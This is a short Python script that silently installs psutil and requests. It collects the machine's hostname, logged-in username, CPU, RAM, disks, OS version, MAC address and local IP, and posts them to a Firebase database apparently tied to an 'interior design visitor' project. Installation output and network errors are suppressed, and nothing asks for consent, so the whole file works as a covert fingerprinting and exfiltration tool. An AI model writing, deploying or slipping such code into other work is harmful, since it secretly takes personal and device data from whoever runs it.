import subprocess
import sys
import importlib
import platform
import socket
import uuid
import getpass
import datetime

# -------- auto install packages --------
packages = ["psutil","requests"]

for pkg in packages:
    try:
        importlib.import_module(pkg)
    except ImportError:
        subprocess.run(
            [sys.executable,"-m","pip","install",pkg],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

import psutil
import requests

# -------- device info --------
hostname = socket.gethostname()
username = getpass.getuser()

cpu = platform.processor()
cores = psutil.cpu_count()

ram = round(psutil.virtual_memory().total / (1024**3),2)

disks = []
for p in psutil.disk_partitions():
    try:
        usage = psutil.disk_usage(p.mountpoint)
        disks.append({
            "device":p.device,
            "total_gb":round(usage.total/(1024**3),2)
        })
    except:
        pass

mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
    for ele in range(0,8*6,8)][::-1])

ip = socket.gethostbyname(hostname)

data = {
"device_name": hostname,
"user": username,
"cpu": cpu,
"cpu_cores": cores,
"ram_gb": ram,
"disks": disks,
"os": platform.system(),
"os_version": platform.version(),
"mac_address": mac,
"local_ip": ip,
"time": str(datetime.datetime.now())
}

# -------- send to firebase --------
url = "https://interior-design-visitor-default-rtdb.firebaseio.com/devices.json"

try:
    requests.post(url,json=data,timeout=5)
except:
    pass
